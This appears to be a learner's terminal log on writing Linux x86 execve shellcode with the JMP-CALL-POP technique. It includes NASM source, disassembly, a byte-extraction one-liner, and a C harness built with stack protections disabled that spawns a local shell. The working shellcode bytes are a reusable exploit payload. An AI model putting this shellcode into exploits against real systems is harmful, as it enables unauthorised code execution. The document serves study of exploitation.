@@ -1,0 +1,186 @@
+Execve Jmp Call Pop
+
+1.) Assemble and run it
+kan1shka9@dev:~/Desktop/Remain/26$ man execve
+EXECVE(2)                                                                                              Linux Programmer's Manual                                                                                              EXECVE(2)
+
+NAME
+       execve - execute program
+
+SYNOPSIS
+       #include <unistd.h>
+
+       int execve(const char *filename, char *const argv[],
+                  char *const envp[]);
+kan1shka9@dev:~/Desktop/Remain/26$ ls
+compile_ld.sh  execve.nasm
+kan1shka9@dev:~/Desktop/Remain/26$ ./compile_ld.sh execve
+[+] Assebling with Nasm ...
+[+] Linking ...
+[+] Done!
+kan1shka9@dev:~/Desktop/Remain/26$ ls
+compile_ld.sh  execve  execve.nasm  execve.o
+kan1shka9@dev:~/Desktop/Remain/26$ ./execve
+Segmentation fault (core dumped)
+Hint: Actively playing with instructions in the code segments where we are overwriting existing locations.
+
+2.) Check for nulls
+kan1shka9@dev:~/Desktop/Remain/26$ objdump -d execve -M intel
+
+execve:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+08048060 <_start>:
+ 8048060:       eb 1a                   jmp    804807c <call_shellcode>
+
+08048062 <shellcode>:
+ 8048062:       5e                      pop    esi
+ 8048063:       31 db                   xor    ebx,ebx
+ 8048065:       88 5e 09                mov    BYTE PTR [esi+0x9],bl
+ 8048068:       89 76 0a                mov    DWORD PTR [esi+0xa],esi
+ 804806b:       89 5e 0e                mov    DWORD PTR [esi+0xe],ebx
+ 804806e:       8d 1e                   lea    ebx,[esi]
+ 8048070:       8d 4e 0a                lea    ecx,[esi+0xa]
+ 8048073:       8d 56 0e                lea    edx,[esi+0xe]
+ 8048076:       31 c0                   xor    eax,eax
+ 8048078:       b0 0b                   mov    al,0xb
+ 804807a:       cd 80                   int    0x80
+
+0804807c <call_shellcode>:
+ 804807c:       e8 e1 ff ff ff          call   8048062 <shellcode>
+
+08048081 <message>:
+ 8048081:       2f                      das
+ 8048082:       62 69 6e                bound  ebp,QWORD PTR [ecx+0x6e]
+ 8048085:       2f                      das
+ 8048086:       62 61 73                bound  esp,QWORD PTR [ecx+0x73]
+ 8048089:       68 41 42 42 42          push   0x42424241
+ 804808e:       42                      inc    edx
+ 804808f:       43                      inc    ebx
+ 8048090:       43                      inc    ebx
+ 8048091:       43                      inc    ebx
+ 8048092:       43                      inc    ebx
+
+3.) Shell code preparation
+kan1shka9@dev:~/Desktop/Remain/26$ objdump -d ./execve|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+"\xeb\x1a\x5e\x31\xdb\x88\x5e\x09\x89\x76\x0a\x89\x5e\x0e\x8d\x1e\x8d\x4e\x0a\x8d\x56\x0e\x31\xc0\xb0\x0b\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43"
+kan1shka9@dev:~/Desktop/Remain/26$ cat -n shellcode_execve.c
+     1  #include<stdio.h>
+     2  #include<string.h>
+     3
+     4  unsigned char code[] = \
+     5  "\xeb\x1a\x5e\x31\xdb\x88\x5e\x09\x89\x76\x0a\x89\x5e\x0e\x8d\x1e\x8d\x4e\x0a\x8d\x56\x0e\x31\xc0\xb0\x0b\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43";
+     6
+     7  main()
+     8  {
+     9
+    10      printf("Shellcode length: %d\n", strlen(code));
+    11
+    12      int (*ret)() = (int(*)())code;
+    13
+    14      ret();
+    15
+    16  }
+kan1shka9@dev:~/Desktop/Remain/26$ gcc -fno-stack-protector -z execstack shellcode_execve.c -o shellcode_execve
+kan1shka9@dev:~/Desktop/Remain/26$ ls
+compile_ld.sh  execve  execve.nasm  execve.o  shellcode_execve  shellcode_execve.c
+kan1shka9@dev:~/Desktop/Remain/26$ ./shellcode_execve
+Shellcode length: 51
+kan1shka9@dev:/home/kan1shka9/Desktop/Remain/26$
+kan1shka9@dev:/home/kan1shka9/Desktop/Remain/26$ ps
+  PID TTY          TIME CMD
+ 4070 pts/17   00:00:01 bash
+ 4770 pts/17   00:00:00 bash
+ 4785 pts/17   00:00:00 ps
+kan1shka9@dev:/home/kan1shka9/Desktop/Remain/26$
+kan1shka9@dev:/home/kan1shka9/Desktop/Remain/26$ exit
+exit
+kan1shka9@dev:~/Desktop/Remain/26$ ls
+compile_ld.sh  execve  execve.nasm  execve.o  shellcode_execve  shellcode_execve.c
+kan1shka9@dev:~/Desktop/Remain/26$ ps
+  PID TTY          TIME CMD
+ 4070 pts/17   00:00:01 bash
+ 4789 pts/17   00:00:00 ps
+ 
+4.) Use /bin/sh as the shell
+kan1shka9@dev:~/Desktop/Remain/26$ ls
+compile_ld.sh  execve  execve.nasm  execve.o  execve_sh.nasm  shellcode_execve  shellcode_execve.c
+kan1shka9@dev:~/Desktop/Remain/26$ cat -n execve_sh.nasm
+     1  ; execve.nasm
+     2
+     3  global _start
+     4
+     5  section .text
+     6  _start:
+     7
+     8      jmp short call_shellcode
+     9
+    10  shellcode:
+    11
+    12      pop esi
+    13
+    14      xor ebx, ebx
+    15      mov byte [esi +7], bl
+    16      mov dword [esi +8], esi
+    17      mov dword [esi +12], ebx
+    18
+    19      lea ebx, [esi]
+    20
+    21      lea ecx, [esi +8]
+    22
+    23      lea edx, [esi +12]
+    24
+    25      xor eax, eax
+    26      mov al, 0xb
+    27      int 0x80
+    28
+    29  call_shellcode:
+    30
+    31      call shellcode
+    32      message db "/bin/shABBBBCCCC"
+kan1shka9@dev:~/Desktop/Remain/26$ ./compile_ld.sh execve_sh
+[+] Assebling with Nasm ...
+[+] Linking ...
+[+] Done!
+kan1shka9@dev:~/Desktop/Remain/26$ ls
+compile_ld.sh  execve  execve.nasm  execve.o  execve_sh  execve_sh.nasm  execve_sh.o  shellcode_execve  shellcode_execve.c
+kan1shka9@dev:~/Desktop/Remain/26$ ./execve_sh
+Segmentation fault (core dumped)
+kan1shka9@dev:~/Desktop/Remain/26$ objdump -d ./execve_sh|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+"\xeb\x1a\x5e\x31\xdb\x88\x5e\x07\x89\x76\x08\x89\x5e\x0c\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\x31\xc0\xb0\x0b\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43"
+kan1shka9@dev:~/Desktop/Remain/26$ ls
+compile_ld.sh  execve  execve.nasm  execve.o  execve_sh  execve_sh.nasm  execve_sh.o  shellcode_execve  shellcode_execve.c  shellcode_execve_sh.c
+kan1shka9@dev:~/Desktop/Remain/26$ cat -n shellcode_execve_sh.c
+     1  #include<stdio.h>
+     2  #include<string.h>
+     3
+     4  unsigned char code[] = \
+     5  "\xeb\x1a\x5e\x31\xdb\x88\x5e\x07\x89\x76\x08\x89\x5e\x0c\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\x31\xc0\xb0\x0b\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43";
+     6
+     7  main()
+     8  {
+     9
+    10      printf("Shellcode length: %d\n", strlen(code));
+    11
+    12      int (*ret)() = (int(*)())code;
+    13
+    14      ret();
+    15
+    16  }
+kan1shka9@dev:~/Desktop/Remain/26$ gcc -fno-stack-protector -z execstack shellcode_execve_sh.c -o shellcode_execve_sh
+kan1shka9@dev:~/Desktop/Remain/26$ ls
+compile_ld.sh  execve  execve.nasm  execve.o  execve_sh  execve_sh.nasm  execve_sh.o  shellcode_execve  shellcode_execve.c  shellcode_execve_sh  shellcode_execve_sh.c
+kan1shka9@dev:~/Desktop/Remain/26$ ./shellcode_execve_sh
+Shellcode length: 49
+$ pwd
+/home/kan1shka9/Desktop/Remain/26
+$ whoami
+kan1shka9
+$ ps
+  PID TTY          TIME CMD
+ 4070 pts/17   00:00:01 bash
+ 4959 pts/17   00:00:00 sh
+ 4963 pts/17   00:00:00 ps
+$ exit
